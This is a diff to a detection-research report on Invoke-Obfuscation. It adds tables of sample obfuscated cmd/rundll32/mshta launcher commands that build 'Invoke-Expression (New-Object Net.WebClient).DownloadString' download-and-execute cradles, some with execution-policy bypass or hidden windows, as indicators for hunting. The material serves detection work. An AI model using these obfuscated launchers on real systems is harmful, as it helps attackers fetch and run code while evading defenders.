@@ -673,7 +673,56 @@ you can copy the results from all cases for one or more obfuscation methods and 
 
 ### RUNDLL++ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">20</td>
+  <td align="center">LAUNCHER\RUNDLL++\*</td>
+  <td>
+   <p><strong>Options LAUNCHER\RUNDLL++\0 - LAUNCHER\RUNDLL++\8 of this launcher just apply different PS keys the same way as <a href="https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation"> LAUNCHER\PS\* (case 10)</a>, so in this case we should only hunt for RUNDLL++ indicators:</strong></p>
+   <p>c:\WiNdOws\sySTeM32\cMd   /c "SeT  jgXU=Invoke-Expression (New-Object Net.WebClient).DownloadString&&RuNdLL32.exe  SHELL32.DLL , ,, ShellExec_RunDLL   "pOWERshelL"      " (.('GI'  ) (  '{0}{1}'-f'ENv:jG','Xu') ).'VALUe' ^|  .  ( '{1}{0}'-f'ex','i' )"</p>
+   <p>C:\wIndows\sysTEM32\cMd.eXE   /C"sET   EvXC=Invoke-Expression (New-Object Net.WebClient).DownloadString&&RunDLL32   SHELL32.DLL, ,  ,ShellExec_RunDLL   "POWeRsheLl"   "-NoEXi "    "  $pctJ7F  =  [TYpE]('{2}{1}{0}{3}'-F 'O','NVir','E','NmeNT')  ;   ( ^&  ( '{0}{1}' -f 'i','tem' ) ('{0}{5}{1}{2}{4}{3}'-f 'v','LE',':EXECu','IoNcOnTexT','T','aRiaB')).'vALUe'.'invoKeCommaND'.(  '{0}{2}{1}{3}'-f'I','KE','Nvo','sCRIpt').Invoke(  (    $Pctj7f::('{2}{0}{3}{1}{5}{4}' -f 'NvIrO','VA','getE','nMEnt','E','rIAbl' ).Invoke(  (  '{1}{0}'-f'C','EvX'),('{1}{0}{2}' -f's','Proce','s' )  ))    )"</p>
+   <p>c:\wInDOWS\SySTeM32\CMD.exe  /c  "Set  gsJ=Invoke-Expression (New-Object Net.WebClient).DownloadString&&C:\WInDoWs\SYSTEM32\RUndll32.exe  SHELL32.DLL ShellExec_RunDLL   "pOwershELL"   " -NONiNter"     "   .('sV' ) je3  (   [TypE]('{2}{0}{1}' -F'NMen','t','envIRO'  )   )   ;    .(  '{4}{3}{0}{1}{2}' -f'pR','EsSio','n','ex','iNVokE-'  )( (   (  . (  '{1}{2}{0}' -f 'ITeM','gE','t-') VAriaBLe:je3  ).VAlUe::( '{3}{5}{0}{4}{1}{6}{2}'-f'nV','Me','IABLE','g','IroN','ETE','NTVar' ).Invoke( 'gSj',( '{1}{0}{2}' -f'OCE','Pr','ss') ) ) )"</p>
+   <p>C:\winDoWS\sYStem32\CMD  /c"sEt  iQw=Invoke-Expression (New-Object Net.WebClient).DownloadString&&C:\WIndoWS\sYSTEm32\runDll32.eXE  SHELL32.DLL,ShellExec_RunDLL   "PoweRShell"  "-NoLOGO "    "  ^&(   ( [strinG]${VERBoSEPReFEReNcE}  )[1,3]  +'X'-JOIn'' ) ( (   ^& ('{2}{0}{1}' -f 'iTe','m','chILD'  ) (  '{1}{0}' -f ':Iqw','EnV')).'VALUE'  ) "</p>
+   <p>CmD.EXE /c  "SEt  igfM=Invoke-Expression (New-Object Net.WebClient).DownloadString&&RuNdll32   SHELL32.DLL ShellExec_RunDLL  "PoWERsheLl"  "  -noPRoFIL "     " (    ^&  ( '{1}{2}{3}{0}' -f 'eM','GE','t-child','IT'  ) ( '{0}{1}' -f'E','nV:igFm' ) ).'VAlUE' ^|    .  ( '{1}{0}'-f 'x','ie')"</p>
+   <p>C:\wINdoWs\sYsTEm32\CMD.eXE  /C  "set  Ahi=Invoke-Expression (New-Object Net.WebClient).DownloadString&&rundLL32 SHELL32.DLL,  , ShellExec_RunDLL  "pOweRshELL" "  -C  "   " ( .(  '{0}{1}'-f 'iT','em') ( '{1}{2}{0}'-f'ahI','EN','V:')).'ValUE' ^|  . ( ${eNV:cOMspEC}[4,15,25]-Join''  )"</p>
+   <p>cmd   /C "seT  LFM=Invoke-Expression (New-Object Net.WebClient).DownloadString&&c:\WinDoWs\sYsTeM32\ruNdll32  SHELL32.DLL ShellExec_RunDLL   "powERshELL"  " -WIndOW  hIdD"    "$PGRV4H = [TyPe](  '{3}{2}{1}{0}'-F 'Nt','E','OnM','ENvIr'  )    ; ${exeCUTIoNcONText}.'INVoKEcOMmaNd'.( '{1}{2}{0}'-f'CRIpT','iNvOkE','s' ).Invoke(    (   (  gi  variAbLE:pgRV4h  ).'vALuE'::(  '{1}{4}{0}{5}{3}{2}{6}' -f'M','GEtEn','vA','t','ViRoN','En','rIabLe' ).Invoke('lfm',('{0}{1}{2}' -f'PROc','E','SS') ) )   )"</p>
+   <p>c:\WINDOws\SysTEm32\CMD.exE  /c "sEt  uCQSx=Invoke-Expression (New-Object Net.WebClient).DownloadString&&RundLL32  SHELL32.DLL,ShellExec_RunDLL   "POWerShELL" "  -eXeCuTIonPOl  bYpaSs  "    "(   ^& ( '{2}{1}{3}{0}'-f 'ItEM','eT-ch','g','iLD') ('{1}{0}{2}'-f 'RIABLe:ex*','va','xT' )).'VAlUE'.'InVokeCommaND'.('{2}{3}{0}{1}'-f 'c','Ript','iNvoKe','S').Invoke( (.('{3}{0}{2}{1}'-f 't-','m','CHIldiTE','GE') ('{0}{1}' -f 'E','NV:UcQsx' )  ).'VAlUE'  )"</p>
+   <p>CMD.ExE   /C "SeT  vPu=Invoke-Expression (New-Object Net.WebClient).DownloadString&&rUnDlL32   SHELL32.DLL,ShellExec_RunDLL   "C:\WinDOWs\SYSwOw64\WiNDOWSPOWERshELl\v1.0\PoWERshELL.exe"     "(  .( '{1}{0}' -f'Ci','g'  ) ( '{0}{2}{1}' -f'e','VPu','nV:'  )).'VaLUE' ^|  ^&  (   ${eNV:cOMSPeC}[4,26,25]-JoIN'')"</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
 
 ### MSHTA++ LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
-
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">20</td>
+  <td align="center">LAUNCHER\MSHTA++\*</td>
+  <td>
+   <p><strong>Options LAUNCHER\MSHTA++\0 - LAUNCHER\MSHTA++\8 of this launcher just apply different PS keys the same way as <a href="https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation"> LAUNCHER\PS\* (case 10)</a>, so in this case we should only hunt for MSHTA++ indicators:</strong></p>
+   <p>c:\winDowS\syStEM32\CmD   /c  "SeT   vaw=Invoke-Expression (New-Object Net.WebClient).DownloadString&&C:\windoWs\SYsTem32\msHTa VBSCrIpt:CREatEObJeCT("WScriPT.ShEll").Run("POwERShElL      (  ^& ( '{1}{0}'-f'I','GC') ('{0}{2}{1}' -f'eNv:','w','Va'  )).'vAlue'   ^|   . (   ${PshOmE}[21] +${psHOme}[34] +'x')",(11-1-9),TRuE)(WiNdOW.ClOsE)"</p>
+   <p>CMD.exE/C  "SeT   Qsk=Invoke-Expression (New-Object Net.WebClient).DownloadString&&C:\windoWS\SYStEm32\MSHtA  VBScRIpT:CREATeObjECt("WSc"+"RIP"+"T."+"SHeLL").RuN("POWERShell  -NoeX     (   ^&(  '{1}{2}{0}' -f 'tEm','get-C','hilDI'  ) ('{1}{0}'-f 'Sk','ENV:Q' ) ).'vAlue'^|^& ( (    ^&  (  'GV'  ) ( '{1}{0}'-f 'dR*','*M')).'name'[3,11,2]-JOIn'')",15-11-3,TRUE)(WiNDOW.CLOSE)"</p>
+   <p>C:\WinDOwS\SystEm32\cMD.EXe   /c "sET  mQn=Invoke-Expression (New-Object Net.WebClient).DownloadString&&MsHta  VBScript:CReATEOBjeCt("WS"+"c"+"r"+"IPT."+"ShelL").Run("POWerSHEll  -NOniNtera    ${EXECUtIonCONText}.'iNVokEcOmmaNd'.(  '{3}{2}{0}{1}' -f 'P','t','OkescrI','iNv'  ).Invoke( (  ^&  ('{0}{1}'-f'GC','I') (  '{0}{1}' -f'EN','v:MQn') ).'VAlUE'    )",(12-11),TrUe)(WIndoW.ClosE)"</p>
+   <p>C:\WindOws\SySTeM32\cmd.exE   /c  "sET   Hlyd=Invoke-Expression (New-Object Net.WebClient).DownloadString&&c:\wInDOws\SYstEM32\mShTA  VBSCRipT:CrEATeOBjecT("WSCRipT.ShElL").RUn("POwErSheLL  -NoLoG  ( .('{1}{0}' -f 'ITem','CHILD') ( '{0}{2}{1}'-f 'eNV','lyd',':H' )).'VAlUE'   ^| .( ${pshomE}[4]  +  ${pSHome}[30]  +  'X')",(24-23),True)(WInDow.Close)"</p>
+   <p>cMD/C   "sET  Nkl=Invoke-Expression (New-Object Net.WebClient).DownloadString&&c:\WINDOWS\sYStEm32\MsHTa  VBSCRIPT:CreaTEObjeCT("WScRIPT.ShelL").RuN("POwersheLl  -nOPRoFIL    ${exEcUtioncONTEXt}.'invoKecOMMAND'.( '{3}{1}{2}{0}' -f 'pT','nvoKEs','cRI','I').Invoke(    (  ^&  (  '{0}{1}' -f'ite','m'  ) ('{2}{0}{1}'-f':n','KL','EnV'  )).'VaLUE' )",1,TrUe)(WINdow.CLOse)"</p>
+   <p>C:\WinDOWs\sySTEm32\CMD   /c"SET   lheP=Invoke-Expression (New-Object Net.WebClient).DownloadString&&C:\WIndows\sYStEm32\MshTA   VBScript:CReaTeObJeCt("WSC"+"RiPT"+".ShElL").RUN("POwErSHeLL -COMma    (.(  '{1}{0}' -f 'i','GC') ('{1}{0}{2}' -f 'v','EN',':lhEp') ).'value'  ^|  ^&  ( ( ^& ('{2}{0}{1}'-f 'ET-va','rIable','g' ) ( '{1}{0}' -f'r*','*MD'  ) ).'NamE'[3,11,2]-JoIN'' )",(9-2-6),TRUe)(WiNdow.ClosE)"</p>
+   <p>c:\wiNDoWs\sYStEm32\cmd.EXe  /c"Set  sPvk=Invoke-Expression (New-Object Net.WebClient).DownloadString&&msHTa.exe  VBSCripT:CreaTEObjeCT("WSCRI"+"pT.SHe"+"l"+"L").RuN("POWERshELL -WindowSTyL 1    (^&  (  '{0}{1}{2}'-f 'cHIldIt','e','M'  ) (  '{0}{1}{2}' -f'E','Nv:spv','K' )).'VAlUe' ^|   .   ( ${PShOmE}[4] + ${psHOME}[30] + 'X' )",1,TRuE)(WindOW.Close)"</p>
+   <p>c:\WIndOws\SYStem32\CMd.exe   /c   "SET  Xuz=Invoke-Expression (New-Object Net.WebClient).DownloadString&&mSHta.Exe VBScriPt:CREatEObJECT("WSCRIPT.SHeLL").RUn("pOwErsHell -eXecuTIO  BYPAsS  ${eXeCUTiONCONText}.'inVOkecOmMANd'.( '{2}{0}{1}' -f'vOkEScRi','Pt','in' ).Invoke(   ( .('{1}{0}{2}' -f'iTe','child','M') ('{2}{1}{0}' -f 'z','U','EnV:X'  ) ).'vAlue'  )",1,TRuE)(WindoW.ClOsE)"</p>
+   <p>cMd  /C "sET   yAt=Invoke-Expression (New-Object Net.WebClient).DownloadString&&MSHTA  VBSCRiPT:CrEaTeOBjECT("WSC"+"R"+"i"+"p"+"t.ShELL").RuN("c:\WIndOWS\sYSWow64\WInDoWspOWErSHeLL\v1.0\pOWErsHeLL.exe     (  .('gV'  ) (  '{0}{1}'-f'eX','*xT' )).'ValUE'.'inVokECoMmand'.( '{2}{3}{1}{0}' -f 'iPt','EsCR','I','nVoK').Invoke((   ^&('{1}{0}' -f 'm','ITe' ) ('{0}{2}{1}'-f'env','AT',':y'  ) ).'vAlUE'    )",(14-13),TRUE)(WinDOW.CLoSe)"</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
